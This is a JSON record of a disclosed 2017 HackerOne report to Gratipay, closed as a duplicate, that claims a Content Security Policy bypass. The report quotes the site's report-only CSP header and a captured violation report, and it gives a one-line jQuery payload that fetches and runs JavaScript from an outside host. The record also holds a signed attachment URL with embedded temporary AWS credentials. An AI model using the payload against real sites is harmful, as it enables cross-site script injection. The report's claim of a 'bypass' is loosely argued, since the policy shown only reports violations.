@@ -1,0 +1,169 @@
+{
+  "id": 241192,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=",
+  "url": "https://hackerone.com/reports/241192",
+  "title": "CSP Policy Bypass and javascript execution",
+  "state": "Closed",
+  "substate": "duplicate",
+  "readable_substate": "Duplicate",
+  "created_at": "2017-06-18T16:12:36.462Z",
+  "submitted_at": "2017-06-18T16:12:36.462Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "athuljayaram",
+    "url": "/athuljayaram",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1868,
+    "url": "https://hackerone.com/gratipay",
+    "handle": "gratipay",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Gratipay",
+      "twitter_handle": "Gratipay",
+      "website": "https://gratipay.com/",
+      "about": "Gratitude? Gratipay! The easiest way for your company to pay for open source."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-06-18T17:40:27.286Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-18T17:40:27.236Z",
+  "team_member_agreed_on_going_public_at": "2017-06-18T16:37:00.988Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\n\nContent-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nin that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \nhttps://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nI have a captured CSP post request in case of violation\n\nPUT /r/default/csp/reportOnly HTTP/1.1\nHost: gratipay.report-uri.io\nConnection: close\nContent-Length: 738\nOrigin: https://gratipay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\nContent-Type: application/csp-report\nAccept: */*\nDNT: 1\nReferer: https://gratipay.com/about/pricing\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\n\n{\"csp-report\":{\"document-uri\":\"https://gratipay.com/about/pricing\",\"referrer\":\"https://gratipay.com/about/\",\"violated-directive\":\"connect-src\",\"effective-directive\":\"connect-src\",\"original-policy\":\"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\",\"disposition\":\"report\",\"blocked-uri\":\"https://sakurity.com/\",\"line-number\":8,\"column-number\":26577,\"source-file\":\"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~\",\"status-code\":0,\"script-sample\":\"\"}}\n\n\n\n\nI like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass\n\nby using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\n\n\nSo using $.get request \nit didn't send a CSP report \nit read the remote content and executed the javascript\n\n\n\n\n\nSOLUTION\nUpdate your javascript libraries mainly jquery  elements to the latest version\n\n",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 195246,
+      "file_name": "gratipay_com.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/246/268cbeeb24fbc8b4a83acc14aa5b2b3d71f0e80f/gratipay_com.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay_com.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay_com.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUWLV4OK2%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T063008Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIE3cd3d%2Bzmz6tm9ddF8CRLLZkTj2esjbFZLlk5OHsY32AiA9Z%2FLP3GO1NqCuKiXfE4JHWOs6ia%2FzQyg0%2BgfhJA93wyqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMdsORBCE8E0pNYsS2Ko4F9KKRL5OIjMDqNsrOgygJddBNzS1HLJYQ8VaYyX4AFk9Fy6NvlOaFF4VQFHcFVgyUKMH%2B8FMz9Htyn%2FydclwctDYuERrCyt0lOGzJDpP0w7rySFp4IKYzIG2HhhkSI%2Ft28H%2F99kj6NqEGlr%2Bzug%2B9qd%2Bo%2FlGPDw99zoAxp8VJN3VMOvFIIQ4bsjshHnfLxlWU9SMYb0xWC40Bt939F7oik8NGVJbRN48mwBHv6PDeYQhSnI6zabGGA7CY0gIS%2F2oATbYmjpQmjTw171wo%2FVVn0zfnFgC7y5yfL%2F8cpuGcc2nUfMqEqjShQRizXe%2BPT8JjSKASBDx4SQe76JOHtQ9POcRHPGCjgvxePIKuwv4JeyCF%2Bro6rC6O%2BmWtJ8lGijz%2BtP%2F%2BwW0JRVni91xIWNhfZuZl8Ss0ADqpMBjoIcC4c%2Bh8BLgbcUMspM1XmbjBOD9LszBxjcOQOMnsRSi%2Bt3LtmMUKZSLKX9iHC5inmOPGXnotPsZaTOSp833V3z%2BfxgTZOFTOUgBW1fokjVC51RZaPoZn4%2BYkSYFHO4q97%2F4r3pLAjgvQNLqa3X1aSbAIvDZgX%2FDBrjflwqweIjrBW7cw9Zyhepwvp5Ej0gDeygmLkl6gOVohjDYI6NgqCkPSWagHcsvlRRaycOheH%2FuO46r7S28ZQb1sIR223JFKghYrVLwfkWcTRj4xSxuMOu2yS8FtJoiyQpnaNC0QB4ixgLV%2Fx34oQP4YLXqrOe6QfV%2FPDfnYFrbc52Dvs5%2FBUYDTuXGAGIxdwHFCo3ORRr%2Bjt44N3SYLredhmZif%2Fu1SY5PUO8EK5guV6Lnon3EE8fVWq84kwoVNOZq5TeJME2VwpdjxuqMKNvp%2BviaU0SLt5XtGMOPCt9IGOrIB99NB04IqLaTXs1qCZS8rsBfN9LYaNKx5%2Fqvk7mGY03T2yxmb1%2BejVoKg0%2BHErsDe92301T3qsC5jiiY5X23D5UOyT%2BRjDXIvuFu%2BLpfNGAqG0ZP73crzEN4WVbHbpKEOCv8M3SDa4bC0MzxLylsgo9Bhpc2Slz85UJigH64gnGEW5Pc6%2BRUEF98Wg6Hooh%2F00dYlqi0r0X728o1rrj%2B0EOXsG2KjCSfYrvK6hQ2Kxk8IWA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6db414a86ede17ad863c100a9827af2b9d5277d08544dc6882911a5c5dafa9f0",
+      "file_size": 70246,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "eveeez",
+    "b7de13fb79e2483638f04b8",
+    "sumit7",
+    "juniorhero"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "241192",
+  "votes": 4,
+  "latest_disclosable_activity_at": "2017-06-18T17:40:27.303Z",
+  "severity": null,
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:30:08.430316",
+    "source": "https://hackerone.com/reports/241192.json",
+    "report_id": 241192
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=",
+    "databaseId": "241192",
+    "title": "CSP Policy Bypass and javascript execution",
+    "url": "https://hackerone.com/reports/241192",
+    "state": null,
+    "substate": "duplicate",
+    "disclosed_at": "2017-06-18T17:40:27.286Z",
+    "created_at": "2017-06-18T16:12:36.462Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": null,
+    "reporter": {
+      "username": "athuljayaram"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4Njg=",
+      "handle": "gratipay",
+      "name": "Gratipay",
+      "url": "https://hackerone.com/gratipay",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI0MTE5Mg==",
+    "_id": "241192",
+    "disclosed": true,
+    "votes": 4,
+    "latest_disclosable_activity_at": "2017-06-18T17:40:27.303Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=",
+      "databaseId": "241192",
+      "title": "CSP Policy Bypass and javascript execution",
+      "url": "https://hackerone.com/reports/241192",
+      "disclosed_at": "2017-06-18T17:40:27.286Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4Njg=",
+      "handle": "gratipay",
+      "name": "Gratipay",
+      "url": "https://hackerone.com/gratipay",
+      "currency": "usd"
+    }
+  }
+}
